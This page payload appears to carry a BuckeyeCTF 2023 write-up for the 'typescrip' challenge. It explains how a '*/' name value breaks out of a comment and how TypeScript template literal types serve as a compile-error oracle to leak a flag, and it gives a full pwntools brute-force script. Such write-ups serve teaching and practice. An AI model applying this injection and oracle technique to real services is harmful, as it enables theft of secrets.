1:"$Sreact.fragment"
2:I[87555,[],""]
3:I[31295,[],""]
4:I[6874,["874","static/chunks/874-3e820bd666038662.js","633","static/chunks/app/writeups/%5Bid%5D/layout-2577bd3482649595.js"],""]
6:I[59665,[],"OutletBoundary"]
8:I[74911,[],"AsyncMetadataOutlet"]
a:I[59665,[],"ViewportBoundary"]
c:I[59665,[],"MetadataBoundary"]
d:"$Sreact.suspense"
f:I[28393,[],""]
:HL["/_next/static/media/e4af272ccee01ff0-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
:HL["/_next/static/css/b7a1bece15a86168.css","style"]
0:{"P":null,"b":"scCeJOABsuN-qPV3g5t-H","p":"","c":["","writeups","a851fdabc90d887a61af81c071f6f0ce"],"i":false,"f":[[["",{"children":["writeups",{"children":[["id","a851fdabc90d887a61af81c071f6f0ce","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/b7a1bece15a86168.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"className":"dark scroll-smooth","children":[["$","head",null,{"children":["$","meta",null,{"charSet":"utf-8"}]}],["$","body",null,{"className":"text-dark dark:text-white dark:bg-midnight","style":{"fontFamily":"'Inter', 'Inter Fallback'","fontStyle":"normal"},"children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","div",null,{"className":"h-screen flex items-center justify-center","children":["$","main",null,{"className":"relative pl-14","children":[["$","svg",null,{"stroke":"currentColor","fill":"currentColor","strokeWidth":"0","viewBox":"0 0 512 512","className":"absolute left-0 top-2 text-5xl text-grapefruit","children":["$undefined",[["$","path","0",{"d":"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z","children":"$undefined"}]]],"style":{"color":"$undefined"},"height":"1em","width":"1em","xmlns":"http://www.w3.org/2000/svg"}],["$","h1",null,{"className":"font-bold text-7xl underline decoration-grapefruit mb-5","children":"404."}],["$","p",null,{"children":"Your requested page was not found."}],["$","$L4",null,{"href":"/","className":"font-medium text-inherit","children":"Return to home →"}]]}]}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}]]}]]}],{"children":["writeups",["$","$1","c",{"children":[null,["$","main",null,{"className":"container pt-20 pb-24","children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]}]]}],{"children":[["id","a851fdabc90d887a61af81c071f6f0ce","d"],["$","$1","c",{"children":[null,[["$","$L4",null,{"href":"/writeups","className":"text-secondary text-sm mb-10 -ml-5 block w-max","children":"← Back to writeups"}],["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L5",null,["$","$L6",null,{"children":["$L7",["$","$L8",null,{"promise":"$@9"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,[["$","$La",null,{"children":"$Lb"}],["$","meta",null,{"name":"next-size-adjust","content":""}]],["$","$Lc",null,{"children":["$","div",null,{"hidden":true,"children":["$","$d",null,{"fallback":null,"children":"$Le"}]}]}]]}],false]],"m":"$undefined","G":["$f",[]],"s":false,"S":true}
b:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
7:null
10:I[50674,["263","static/chunks/bc9c3264-6371ca03223855d4.js","810","static/chunks/48507feb-8452885980bba250.js","330","static/chunks/08ffe114-f47006c90e36a3eb.js","800","static/chunks/800-bd0deb6e7b7e903a.js","134","static/chunks/app/writeups/%5Bid%5D/page-54fe20cc7a9d3224.js"],"default"]
11:T6aa,import { createServer } from "net";
import { Project } from "ts-morph";

const flag = process.env.FLAG ?? "bctf{fake_flag}";

function compile(source) {
    const project = new Project({ useInMemoryFileSystem: true });
    const sourceFile = project.createSourceFile("temp.ts", source);
    const diagnostics = sourceFile.getPreEmitDiagnostics();

    return diagnostics.map(diagnostic => {
        const severity = ["Warning", "Error", "Suggestion", "Message"][diagnostic.getCategory()];
        return `${severity} on line ${diagnostic.getLineNumber()}`;
    });
}

const server = createServer(socket => {
    socket.write("What is your name?\n> ");
    socket.once("data", data => {
        const name = data.toString().trim();
        socket.write(`Hello, ${name}. Give me some code: (end with blank line)\n> `);
        let code = '';
        let done = false;
        socket.on('data', data => {
            if (done) return;
            const line = data.toString().trim();
            if (!line) {
                done = true;
                socket.write('Thinking...\n');

                const today = new Date().toLocaleDateString('en-us');
                const source = `/* TYPE CHECKED FOR ${name} ON ${today}. THE FLAG IS "${flag}". */` + "\n\n" + code;

                const errors = compile(source);

                if (errors.length === 0) {
                    socket.write('Congrats, your code is perfect\n');
                } else {
                    socket.write(errors.join('\n') + '\n');
                }

                socket.destroy();
            }
            if (!done) socket.write('> ');

            code += line + '\n';
        })
    });
});

server.listen(1024);5:["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"BuckeyeCTF 2023 — typescrip"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"I like typescript. Do you like typescript?"}],"\n",["$","p","p-1",{"children":["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nc chall.pwnoh.io 13381"}]}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a JavaScript server that looks like this:"}],"\n",["$","$L10","pre-0",{"className":"my-2","children":"$11","language":"js"}],"\n",["$","p","p-1",{"children":"The server takes in a \"name\" and some code, then writes and type checks a TypeScript file resembling"}],"\n",["$","$L10","pre-1",{"className":"my-2","children":"/* TYPE CHECKED FOR {name} ON 9/29/2023. THE FLAG IS \"bctf{some_flag}\". */\n\n// your code here","language":"ts"}],"\n",["$","p","p-2",{"children":["reporting back any compilation errors. Note that we don't get what the type errors ",["$","em","em-0",{"children":"are"}],", just whether they exist (and how many there are, and their line numbers)."]}],"\n",["$","p","p-3",{"children":["The main idea is that we can brute force the flag based on whether compilation errors exist in the code. We can break out of the block comment by setting our \"name\" to ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"*/"}],", and store the flag in a (multiline) string using backticks:"]}],"\n","$L12","\n","$L13","\n","$L14","\n","$L15","\n","$L16","\n","$L17","\n","$L18"]}]}]
12:["$","$L10","pre-2",{"className":"my-2","children":"/* TYPE CHECKED FOR */foo(` ON 9/29/2023. THE FLAG IS \"bctf{some_flag}\". */\n\n`)\nfunction foo(x: ...) {}","language":"ts"}]
13:["$","p","p-4",{"children":["Then, type check this string by passing it into the argument to ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"foo()"}],". We can use ",["$","a","a-0",{"href":"https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html","children":"template literal types"}]," to match the flag one character at a time:"]}]
14:["$","img","img-0",{"width":541,"alt":"image","src":"https://user-images.githubusercontent.com/60120929/271787173-bec30743-e4d2-4446-9c53-ebac05d0bdb5.png"}]
15:["$","img","img-1",{"width":960,"alt":"image","src":"https://user-images.githubusercontent.com/60120929/271787201-15c1a765-7c83-4eb0-b2de-f48a37f15e57.png"}]
16:["$","p","p-5",{"children":"If the code compiles, we know the character is in the flag, and can keep looping over characters until none match."}]
17:["$","p","p-6",{"children":"Here's a quick and inefficient script that does just that:"}]
19:T47a,import pwn

flag = ''
letters = [
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',
    'X', 'Y', 'Z',
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w',
    'x', 'y', 'z',
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '_', '$', '@',
]

while True:
    for letter in letters:
        conn = pwn.remote('chall.pwnoh.io', 13381)

        print(conn.recvline())
        conn.send(b'*/foo(`\n')

        print(conn.recvline())
        conn.recv()
        conn.send(b'`)\n')

        conn.recv()
        code = 'function foo(x: `${string}bctf{' + flag + letter + '${string}}${string}`) {}\n'
        conn.send(code.encode())

        conn.recv()
        conn.send(b'\n\n\n\n')

        print(conn.recvline())
        res = conn.recvline()
        print(res)
        if res == b'Congrats, your code is perfect\n':
            flag += letter
            print(f'bctf{{{flag}}}')
            break
        else:
            print(letter)

        conn.close()
    else:
        break

print(f'bctf{{{flag}}}')18:["$","$L10","pre-3",{"className":"my-2","children":"$19","language":"py"}]
9:{"metadata":[["$","title","0",{"children":"BuckeyeCTF 2023 — typescrip | kevin.fish"}],["$","meta","1",{"name":"description","content":"I like typescript. Do you like typescript?"}],["$","meta","2",{"property":"og:title","content":"BuckeyeCTF 2023 — typescrip"}],["$","meta","3",{"property":"og:description","content":"I like typescript. Do you like typescript?"}],["$","meta","4",{"name":"twitter:card","content":"summary"}],["$","meta","5",{"name":"twitter:title","content":"BuckeyeCTF 2023 — typescrip"}],["$","meta","6",{"name":"twitter:description","content":"I like typescript. Do you like typescript?"}]],"error":null,"digest":"$undefined"}
e:"$9:metadata"
